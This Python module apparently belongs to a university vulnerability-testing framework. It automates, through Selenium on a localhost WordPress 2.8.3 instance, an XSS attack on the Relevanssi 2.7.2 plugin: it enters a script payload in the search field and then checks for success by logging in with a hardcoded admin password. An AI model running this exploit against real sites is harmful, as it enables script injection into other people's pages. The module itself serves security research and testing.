
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.

import framework
import time

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_71236",
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','71236'],['http://www.exploit-db.com/exploits/16233/']],
                  'Target' : "Wordpress 2.8.3",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-ID:_71236",
                  'Plugin' : "Relevanssi 2.7.2",
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
    
    def exploit(self):
        payload = "<script>prompt(\"Attack\")</script>"
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress")
        self.logger.info("Page opened successfully: %s", driver.title)
        self.logger.info("uploading payload: %s", payload)
        driver.find_element_by_id("s").send_keys(payload)
        driver.find_element_by_id("searchsubmit").click()
        time.sleep(3)
        driver.cleanup()
        return

    def verify(self):
        driver = self.create_selenium_driver()
        try:
            driver.get("http://localhost/wordpress/wp-login.php")
            driver.find_element_by_id("user_login").clear()
            driver.find_element_by_id("user_login").send_keys("admin")
            driver.find_element_by_id("user_pass").clear()
            driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
            driver.find_element_by_id("wp-submit").click()
            driver.get_element(by_xpath="//*[contains(@href, 'index.php?page=relevanssi')]").click()
            return True
        except: 
            return False



